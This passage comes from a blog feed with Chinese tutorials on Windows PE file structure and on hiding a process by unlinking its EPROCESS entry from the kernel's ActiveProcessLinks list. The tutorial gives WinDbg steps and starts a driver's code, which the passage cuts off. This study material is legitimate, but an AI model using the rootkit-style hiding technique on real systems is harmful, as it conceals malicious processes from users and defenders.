        <content type="html"><![CDATA[<h1>PE文件架构学习(二)</h1><h2 id="一-区块表（Section-Table）">一.区块表（Section Table）</h2><p>​在PE文件与原始数据之间存在一个区块表。区块表中包含每个块在映像中的信息，分别指向不同的区块实体，一个区块对应一个块表，可以把一个区块想象成一个人，然后人的身份信息就被放在了块表里面，块与区块表的对应关系如下：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163651277-372832366.png" alt="image-20240316172355910"></p><p>​紧跟着 IMAGE_NT_HEADERS 的是区块表，它是一个<strong>IMAGE_SECTION_HEADER 结构体</strong>。每个 IMAGE_SECTION_HEADER 结构包含了它所关联的区块的信息，例如位置、长度、属性等等，其结构如下：</p><p>​<img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163651414-1981356820.png" alt="image-20240316172457896"></p><p>​上述信息都可以对照PEstudy来进行查找，在这儿不一一赘述，然后就是记住一个区段的结尾就是下一个区段的开始。</p><h2 id="二-常见区块与区块合并">二.常见区块与区块合并</h2><p>​当对一个exe文件进行查壳的时候，可以进行区块的查看，下面是一个常见的区块名总结：</p><p>​<img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163651545-21017059.png" alt="image-20240316174334257"></p><p>​如若发现除此之外的比较可以的区块的话，那就应该当心此exe大概率有壳。</p><p>​区块中的数据逻辑通常是关联的，PE文件一般至少有两个区块，一个是代码块，另一个是数据块，每个区块都有特定的名字，这个名字用于表示区块的用途，咱们也可以创建和命名自己的区块，大部分的程序只使用编译器产生的默认的区块，但偶尔可能有一些特殊的需求，需要将代码或数据放到一个单独的区块里，例如建立一个全局共享块。</p><p>​同时，如果有两个区块有相似或者一直的属性，那么它们在链接时能合并成一个区块。</p><h2 id="三-区块的对齐值">三.区块的对齐值</h2><p>​<strong>区块的大小是要对齐的</strong>，即是每个区段所占的位置都要对齐，在x86中，一般为1000h，而在x64中一般为2000h。</p><h2 id="四-输入表">四.输入表</h2><p>​一个<strong>可执行文件使用了来自其他DLL的代码或数据的动作</strong>称为输入。当一个PE文件被载入时，Windows加载器的工作之一就是<strong>定位所有被输入的函数和数据，并让正在载入的文件可以使用那些地址</strong>。这一整个过程就是通过PE文件的输入表（Import Table 也称导入表）完成的。输入表中保存的是函数名和其驻留的DLL名等动态链接所需要的信息。</p><h2 id="五-输入函数">五.输入函数</h2><p>​输入函数就是被程序调用但其执行代码不在程序中的函数，这些函数的代码位于相关的DLL文件中，在调用者程序中只保留了相关的函数信息，函数名和DLL文件名等**（不包括函数的地址信息）<strong>。且只有当磁盘中的文件被装载到内存当中的时候，Windows加载器才会将相关的DLL载入，并将调用</strong>输入函数的指令<strong>和</strong>函数实际的地址**联系起来（一种隐式链接，只不过在Windows的加载器中自动完成罢了，在我们的代码当中肯定是不会体现的）。</p><p>​在PE文件当中有一组数据结构，它们分别对应于被输入的DLL。<strong>每一个这样的结构都给出了被输入的DLL的名称并指向一组函数指针</strong>，这组函数指针被称为输入地址表（Import Address Table，IAT），一但模块被载入，IAT中将包含所有要调用输入的函数的地址。</p><p>​由下图演示：红框处即为程序的载入基址</p><p>​<img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163651381-681063886.png" alt="image-20240317231811743"></p><p>​再加上下图导入表中所示的函数的偏移地址信息，到x32的 dbg 上查找一下：即为0002E264+00400000</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163651406-1637308652.png" alt="image-20240317232131807"></p><p>​从 dbg 中的汇编栏中直接ctrl+g搜索一手：0042E264</p><p><strong><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163651462-2109091367.png" alt="image-20240317232537379"></strong></p>]]></content>
      
      
      <categories>
          
          <category> PE结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件架构学习(一)</title>
      <link href="/posts/3436645d.html"/>
      <url>/posts/3436645d.html</url>
      
        <content type="html"><![CDATA[<h1>PE文件结构</h1><h2 id="一-PE文件基本概念">一.PE文件基本概念</h2><p>​PE文件是windows系统中遵循PE结构的文件，比如以.exe .dll .ocx .sys .com为后缀名的文件以及系统驱动文件。<strong>PE文件是微软Windows操作系统上的程序文件</strong>（可能是间接被执行的，如DLL）</p><p>​官方解释链接 <a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format">PE 格式 - Win32 apps | Microsoft Learn</a></p><p>​顾名思义，世界上各种东西都有自己特定的结构，最简单和直观理解的例子就是我们自己身体的结构，由一个各个部位和器官关节来组成的，而同样的，PE文件也有着它自己所独特的结构。只有有了特定的结构之后，整个文件才能更加有序和规律地去处理代码以及数据，去执行操作等一系列的过程。</p><p>​PE文件的大致宏观结构图如下：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525199-1722741693.png" alt="image-20240313144242125"></p><p>​通过上面的图示，我们可以看到一个PE文件的结构大致分为PE文件头、区块数据，（上图紫色部分为PE文件头部分，橙色部分为区块数据部分），PE文件使用的是一个平面地址空间，所有代码和数据都合并在一起，组成了一个很大的结构，区块中包含代码或数据，各个区块按页边界对齐，区块没有大小限制，是一个连续的结构，每个块都有它自己在内存中的一套属性，例如这个块是否包含代码、是否只读或可读/写，详细图如下：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525270-999110570.png" alt="image-20240313144801449"></p><p>​其中核心部分为<strong>PE文件头、区块表、区块</strong>三部分，其中的DOS部首部分是16位程序的一个残留，而如今计算机程序都已经发展到了32位甚至64位，所以DOS部首不咋重要了。</p><p>​PE文件并非就单放在磁盘中不起作用，都说了是可执行文件，肯定是要被装在到内存当中去执行的，当PE文件被装载到内存当中运行起来的时候，<strong>它会被拉伸</strong>，具体的位置表现在块中，同时磁盘上的数据结构布局和内存中的数据结构布局就是一致的。具体如下图：</p><p>​<img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525166-118904565.png" alt="image-20240313150148701"></p><p>​而当这个PE文件被运行起来之后就会被叫做<strong>模块(Module)</strong>，映射文件的起始地址称为<strong>模块句柄</strong>，也叫做基地址。在32位的Windows系统中可以直接调用 GetModuleHandle  的api以取得指向模块的指针，通过该指针直接访问该模块的内容。该函数结构如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HMODULE <span class="title">GetModuleHandleA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpModuleName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>​调用该函数时所需的参数是一个可执行文件或者是DLL文件名字符串，如果系统找到了文件，则会返回该可执行文件或DLL文件映像所加载的基地址。（指定路径时，请务必使用反斜杠 \ ，而不是使用 /），如果该函数成功，则返回值是指定模块的句柄，失败则返回NULL。</p><h2 id="二-相对虚拟地址">二.相对虚拟地址</h2><p>​在windows系统中，PE文件被系统加载器映射到内存中，每个程序都有自己的虚拟空间，这个虚拟空间的内存地址称为<strong>虚拟地址(VA)</strong>，EXE默认的加载基址是400000h,DLL文件默认基址是10000000h。需要注意的是基地址不是程序的入口点。 为了避免在PE文件中出现绝对内存中的地址所以引入了<strong>相对虚拟地址（RVA）<strong>的概念。RVA只是内存中的一个简单的相对于PE文件载入地址的</strong>偏移位置</strong>，而在winodws系统当中，每个系统版本的偏移量都有可能不同。例如，假设一个EXE文件从400000h处载入，而且它的代码区块开始于401000h处，故代码区块的RVA计算方法如下：<br>$$<br>目标地址  401000h - 载入地址  400000h  = 相对虚拟地址 1000h<br>$$<br>​而将一个RVA转换成真实的地址只是简单地翻转一下上述过程，即用实际的载入地址加上RVA，得到实际的内存地址，他们之间的关系如下：<br>$$<br>虚拟地址（VA） =  基地址（ImageBase） + 相对虚拟地址（RVA）<br>$$<br>​<strong>入口点(OEP)</strong>：首先明确一个概念就是OEP是一个RVA，然后使用OEP +Imagebase ==入口点的VA，通常情况下，OEP指向的不是main函数。</p><p>​文件偏移地址(FOA)：当PE文件储存在某个磁盘当中的时候，某个数据的位置相对于文件头的偏移量。</p><h2 id="三-分部解析PE结构的各个部分">三.分部解析PE结构的各个部分</h2><p>先用一张图来概括一下各个部分的关系：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525522-813963379.png" alt="image-20240313211740499"></p><h3 id="一-DOS头部">一.DOS头部</h3><p>​DOS系统是相当古老的，是一个16位的操作系统（现在windows环境下的命令提示符窗口用的就是DOS的界面），前言是微软当时在设计PE文件的时候目的是为了让其兼容区间更大，兼容除了向上兼容以外还有向下兼容的需求。因此，为了能够兼容16位程序的运行，PE文件格式在设计的时候，设计了MS-DOS头部，它位于PE文件架构的最头部位置，有了它，一但程序在DOS下执行，DOS就能识别出这是一个有效的执行体。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163524602-1702792964.png" alt="image-20240313204859930"></p><p>​而DOS头又称之为DOS部首，由 DOS stub 和 DOS ‘MZ’ HEADER两部分组成。DOS头结构图如下：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525154-1510240896.png" alt="image-20240313205237914"></p><p>​上图标红的两个部分尤为重要，其余部分在初步学习中可以忽略不计，分别是 <strong>e_magic 和 e_lfanew</strong>，e_magic 字段（一个字大小）的值需要被设置为5A4Dh，在ASCII表示法里它的ASCII值为“MZ”，是MS-DOS的创建者之一的名字缩写，而 e_lfanew 字段是真正的PE文件头的相对偏移（RVA），<strong>其指出了真正的PE头的文件偏移位置</strong>，占用<strong>四字节</strong>，<strong>其位于从文件开始的3Ch字节处</strong>。</p><p>​下面用010（16进制编辑器）查看一下一个exe示例：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163524620-700595810.png" alt="image-20240313210846935"></p><p>​上图中E8至50之间的杂七杂八的是DOS头的一个残留，它们组成了DOS stub这个部分，其中还存了一个错误提示，是为16位的程序准备的，所以可以不用理会，可以直接在010中清除掉，我们的原程序运行也不会受影响。</p><h3 id="二-PE文件头">二.PE文件头</h3><p>​紧跟着DOS stub 的是PE文件头（PE Header）。“PE Header”是PE相关结构的NT映像头（IMAGE_NT_HEADERS）的简称，（NT操作系统在windows操作系统的发展当中是相当重要的一个环节），其中包含许多PE装载器都能用到的重要字段。实际上有两个版本的IMAGE_NT_HEADER结构一个是为PE32（32位版本）可执行文件准备的，另一个是PE32+（64位版本），但二者几乎没有区别。当执行体在支持PE文件结构的操作系统中执行时，PE装载器将从上一DOS部分中的IMAGE_DOS_HEADER结构的 e_lfanew 字段中找到PE Header的起始偏移量，<strong>用其加上基址</strong>便得到了PE文件头的指针，如上图中的箭头所示。公式如下：<br>$$<br>PNTHeader = ImageBase + dosHeader -&gt; e.lfanew<br>$$<br>​PE文件头由三个部分组成，下图是IMAGE_NT_HEADER64的结构，左边的数字是到PE文件头的偏移量，而第一个字段singnature即是PE文件的标识。所以下文分为三个部分开讲。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525088-1677408214.png" alt="image-20240314192614476"></p><p>一.Signature和第二大部分DOS头中的DOS-MZ的作用差不多，都是作为一个标记，且被填充为0x00004550，ASCII码中即为PE，DOS部分中的IMAGE_DOS_HEADER结构的  e_lfanew 字段正是指向“PE\0\0”。（具体请见上面第二幅图中）</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163524875-1320394236.png" alt="image-20240314192009862"></p><p>二.映像文件头 IMAGE_FILE_HEADER 结构如下：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525019-716809624.png" alt="image-20240314194049365"></p><p>​上图中包含了PE文件的一些基本信息，最重要的是<strong>其中一个域指出了 IMAGE_OPTIONAL_HEADER的大小</strong>，上图左侧的偏移量是基于PE文件头（IMAGE_NT_HEADERS）的。下图给出一个示例（使用studyPE查看，该工具会在文末给出）：左图是从010中查看的，右图是StudyPE中查看的</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525260-2029230252.png" alt="image-20240314205957073"></p><p>​</p><p>​<img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163524712-1145840193.png" alt="image-20240314210823907"></p><p>​</p><p>​1.Machine：可执行文件的目标CPU类型，不同平台的机器码不同。</p><p>​2.NumberOfSections：区块的数目，也就是节表数，即上图中的0C。</p><p>​3.TimeDateStamp：表示文件的创建时间。</p><p>三.可选映像头 IMAGE_OPTIONAL_HEADER</p><p>​IMAGE_OPTIONAL_HEADER（可选映像头）是一个可选的机构，实际上 IMAGE_FILE_HEADER 结构不足以定义PE文件属性，因此可选映像头中定义了更多的数据。已知NT头开始处加14h处是文件属性的大小图中为E0，且蓝色区块即为文件属性全部内容，从NT头处加16h（切记是16进制数，对应到10进制的话往后数22位即可）即是文件属性的开始，如下图：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525194-2021044649.png" alt="image-20240314214400489"></p><p>​下图是 IMAGE_OPTIONAL_HEADER 结构图，左边对应的是其偏移量：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525370-1988196134.png" alt="image-20240314214651235"></p><p>​感兴趣的师傅可以对照上表去研究一下。</p><h2 id="三-小结：">三.小结：</h2><p>​本篇大概论述了PE文件中的DOS头和PE头的基本结构，如有错误还请师傅们指正，最后贴出一个宏观查看PE整个结构的工具<strong>OpenArk</strong>，以及文中所使用到的工具PEstudy的下载链接，有需要的师傅自取。</p><p>​<a href="https://wwz.lanzouj.com/b05l2evti">https://wwz.lanzouj.com/b05l2evti</a>    密码:99ax</p><p>​OpenArk的使用截图如下，将选项卡选择到红框处即可拖拽使用：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606163525105-101242668.png" alt="image-20240314215704091"></p><p>​</p>]]></content>
      
      
      <categories>
          
          <category> PE结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>断链隐藏进程及恢复（附代码）</title>
      <link href="/posts/d349b5d.html"/>
      <url>/posts/d349b5d.html</url>
      
        <content type="html"><![CDATA[<h1>断链隐藏进程及恢复（附代码）</h1><h2 id="一-前言：">一.前言：</h2><p>​继Strider上次问了我如何隐藏一个进程之后，这周仔细研究了一下，首先去了解了一下隐藏进程的各种方法，其实有很多方法很多也很杂，然后有些隐藏只是能躲过任务管理器还有ntdll里面ZwQuerySystemInformation函数（枚举进程的函数），然后通过一些暴力的枚举方法还是会露馅，就总结一些常见的吧：</p><p>​1.比较简单的即是内核中映射的进程列表进行断链操作，此处是一个双链表（后文会详细赘述）</p><p>​2.其次就是修改内核映射中的EPROCESS中对应的pid，也能实现隐藏</p><p>​3.然后就是对于DriveObject信息的抹除（没看懂，系统学内核了再复现）</p><p>而本文也是就第一种方法展开复现，来进行进程的隐藏。</p><h2 id="二-踩坑：">二.踩坑：</h2><p>​首先，我们知道，进程体EPROCESS是被系统维护在一个<strong>双向链表LIST_ENTRY</strong>中的，那么，我们只要把进程的EPROCESS从这个链表中摘除，就可以实现进程隐藏了，当然，这只能瞒过进程管理器和ntdll中的zwQuerySystemInformation，暴力枚举依旧可以发现断链隐藏的进程，因为进程体还在内存中。</p><p>​然后开始进行断链操作，借助windbg实现操作，一直在纠结一个问题就是能否在自己的本机上调试本机的内核，然后问了一下鹏哥，确实是可以的，然后就有点踩坑地开始复现了，网上很多关于windbg使用的教学都是老版本的，然后微软好像22年就开始禁用了离线符号包的下载使用了，我在本机上下载了老版本的windbg，在配置符号文件的时候一直卡着过不去。</p><p>​一开始使用的时候，先附加了需要隐藏的一个进程，输入命令<code>dt _eprocess</code>，一开始看到了eprocess 的结构，没意识到犯了<strong>很严重的错误</strong>（后续文章中会讲述）。</p><p>​<img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757432-543074220.png" alt="image-20240420193537445"></p><p>​</p><p>​直到后面查看内核映射中的进程列表信息的时候才意识到有点蠢，继续输入命令<code>! process 0 0</code>，开始出现最头疼的报错了</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757064-755237795.png" alt="image-20240420194030938"></p><p>​然后一直搜一直搜，搜到了问题是得修复一下ntdll的符号文件，然后这个符号文件一般是可以进行离线下载的，但是按照网上说的设置符号下载位置的方法<code>srv*yourpath*http://msdl.microsoft.com/download/symbols</code>，设置完成之后我们重启计算机，用windbg 附加一个进程来下载符号，然后<strong>还是不太好使！</strong></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757106-1026019809.png" alt="image-20240420194800419"></p><p>​然后我就搜到了这个。。。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757501-679608383.png" alt="image-20240420194948859"></p><p>​不甘心没有，然后进了上述命令中的http://msdl.microsoft.com/download/symbols地址一探究竟，然后我就放弃了。。。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757420-2043512384.png" alt="image-20240420195220939"></p><p>​遇到困难了，由于辉哥这两天比较忙，所以求助了一下鹏哥，由于鹏哥之前是在XP上使用的windbg，然后就得到了鹏哥XP的克隆（真香），同时也得到了一份老版windbg的32位和64位安装包，以及最最重要的符号文件！！！</p><h2 id="三-正文开始">三.正文开始</h2><h3 id="1-严重错误剖析">1.严重错误剖析</h3><p>​开始在XP上进行实验，正常的安装windbg和下载符号文件（打包成exe太爽了）之后，开始进行调试。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757557-1442031848.png" alt="image-20240420200209949"></p><p>​？！woc，换了个方式又报了个错，然后搜了一下，感觉有被自己蠢到，发现了上文中所说的<strong>严重错误</strong>，体会到了再没熟悉windbg使用就瞎敲命令的下场：</p><p>​windbg命令分为标准命令（40个左右），元命令（一百多个）和扩展命令。</p><p>​标准命令提供最基本的调试功能，不区分大小写。如：bp g dt dv k等<br>​元命令提供标准命令没有提供的功能，也内建在调试引擎中，以.开头。如.sympath .reload等<br>​扩展命令用于扩展某一方面的调试功能，实现在动态加载的扩展模块中，以!开头。如!analyze等</p><p>​每个调试命令都各有使用范围，有些命令只能用于内核调试，有些命令只能用于用户调试，有些命令只能用于活动调试。但用户也不必记得这许多，一旦在某个环境下，使用了不被支持的命令，都会显示“No export XXX found”的字样。就拿!process命令来说吧，<strong>它显示进程信息，但只能用于内核调试中，如果在用户调试中使用</strong>，就是下面的情景：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0</span>:<span class="number">001</span>&gt; ! process <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="attribute">No</span> export process found</span><br></pre></td></tr></table></figure><p>​所以，在使用windbg进行调试的时候，一定要搞清楚你是在那种模式下进行调试，还是那句老话，在使用之前，你要清楚你自己在干什么。关闭windbg之后，重新启动并切换windbg模式至内核debug</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757449-1937310107.png" alt="image-20240420201201218"></p><p>​选至本地：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757327-1004197475.png" alt="image-20240420201230115"></p><p>然后你就会惊奇的发现左下角的开头变了：（lkd也算是内核调试的标志了）</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757432-1952939439.png" alt="image-20240420201313339"></p><p>输入命令<code>! process 0 0</code>，即可看到进程列表</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757333-195509647.png" alt="image-20240420201631737"></p><h3 id="2-真正的正文开始">2.真正的正文开始</h3><p>首先我们遇到两个问题：</p><p>1.既然要遍历链表，我们就要知道每个结构的前后结构；</p><p>2.既然要对比进程名，我们就要知道进程名放在哪个地方；</p><p>先查看一手该版本系统下的eporcess结构体中各项数值的偏移量（基于windows的版本不同各有偏差，并不唯一）</p><p>​输入命令<code>dt _eprocess</code>，主要查看下图中标记的两处位置的偏移量</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757313-341192144.png" alt="image-20240420202735543"></p><p>（1）. ActiveProcessLinks</p><p>​EPROCESS块中有一个ActiveProcessLinks成员，它是一个PLIST_ENTRY结构的<strong>双向链表</strong>。当一个新进程建立的时候父进程负责完成EPROCESS块，然后把ActiveProcessLinks链接到一个全局内核变量PsActiveProcessHead链表中。(可以看成双链表中的一个节点地址，而此节点中分别存储的是该进程在链表中的上下进程的指针地址)</p><p>​紧接着输入命令<code>dt _LIST_ENTRY</code>，查看LIST_ENTRY的结构</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757024-251935355.png" alt="image-20240420203819388"></p><p>​可以看到变量FLink和BLink，FLink指向当前节点的后一个节点的ActiveProcessLinks地址，BLink指向当前结点的前一个节点的ActiveProcessLinks地址，这块儿的两个地址一定别记反，后面即是通过他们来找到锁定进程的上下进程的。</p><p>（2）.ImageFileName</p><p>​在上上图中，我们可以看到在偏移0x174处，出现了ImageFileName，这里存的就是<strong>我们要找的进程名</strong>。</p><p>​接着再输入一遍命令<code>! process 0 0</code>，随便选择一个进程，这里选择 vmtoolsd.exe，注意记住它的上下邻接进程</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757459-1116328335.png" alt="image-20240420204510507"></p><p>​然后查看该进程的eprocess，输入命令<code>dt _eprocess 85f5ab28</code>,可看出 ActiveProcessLinks 处由两个数值相减，相比他们就是上文中提到的变量FLink和BLink吧，然后反复思考，一个进程的ActiveProcessLinks由两个变量组成，双指针，那尾减去头一定就是本身的地址了。故下图中0x85f42e28应该是BLink，而0x85f34ca0也就是FLink，分别指向当前结点的前后两个节点的ActiveProcessLinks地址。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757527-1146679691.png" alt="image-20240420204947114"></p><p>​OK，那么事情已经明了了，进程被映射到内核之中后被列举成了这一串双链表，而我们只需要摘除掉其中的那个目标就行，也就是说需要通过检索到的目标进程之后，通过它的eprocess中的ActiveProcessLinks进而实现断链操作，所以我们现在要做的就是通过ActiveProcessLinks中存储的两个值，访问到应该在进程链表中排与目标进程前后的两个进程的eprocess。</p><p>​1.按着上图中的例子走，先试着访问一手目标进程后面的进程是啥，输入命令<code>dd 0x85f34ca0</code>，查看地址0x85f34ca0中的内容</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757032-1764610746.png" alt="image-20240420210418864"></p><p>​已知0x85f34ca0中存储的是指向目标进程的下一个进程的ActiveProcessLinks信息，再由上文中总结出来的“后减前原则”，故可知</p><p>85f3b688中存储的是后一个进程再后一个进程的ActiveProcessLinks，而85f5abb0中存储的是前一个进程（此时也就是我们的目标进程的ActiveProcessLinks），不信可以输入命令<code>dd 0x85f5abb0</code>进行如下验证：（对照上上图中目标进程的ActiveProcessLinks的值即可）</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757125-122055031.png" alt="image-20240420211025654"></p><p>​注意，因为FLink指向当前节点的后一个节点的ActiveProcessLinks地址，所以后一个节点的EPROCESS地址为ActiveProcessLinks地址中的（0x85f34ca0）减去偏移0x88，成功。</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757186-1841452294.png" alt="image-20240420212657461"></p><p>​2.同理，这块采用比较笨的方法进行运算，因为我对地址偏移的操作还不太那么熟悉，那么我只要拿到了目标进程中指向前一个进程ActiveProcessLinks的地址，然后输入命令<code>dd 0x85f42e28</code>，再拿出前一个进程中指向再前一个进程的ActiveProcessLinks的地址中的指向后一个进程的FLink，在用这个Flink地址-0x88，故可得到结果：</p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757420-1088549092.png" alt="image-20240420213608682"></p><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606162757357-638209488.png" alt="image-20240420213639665"></p><p>​</p><p>综上所述，我们已经由已知的目标进程求出了起前后两个进程的eprocess，接下来直接进行断链操作即可，然后实现对于进程的隐藏，贴出大佬的脚本如下：（我还没写过驱动程序，所以脚本的复现还没进行，不过指日可待）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CXX_HIDEPROCESS_H</span></span><br><span class="line"><span class="meta">#    <span class="keyword">include</span> <span class="string">&quot;HideProcess.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ULONG_PTR ActiveOffsetPre =  <span class="number">0</span>;</span><br><span class="line">ULONG_PTR ActiveOffsetNext = <span class="number">0</span>;</span><br><span class="line">ULONG_PTR ImageName = <span class="number">0</span>;</span><br><span class="line">WIN_VERSION WinVersion = WINDOWS_UNKNOW;</span><br><span class="line"></span><br><span class="line">PLIST_ENTRY Temp = <span class="literal">NULL</span>;</span><br><span class="line">PLIST_ENTRY HeadEntry = <span class="literal">NULL</span>;</span><br><span class="line">NTSTATUS</span><br><span class="line">    <span class="title function_">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegisterPath)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;DriverEntry\r\n&quot;</span>);</span><br><span 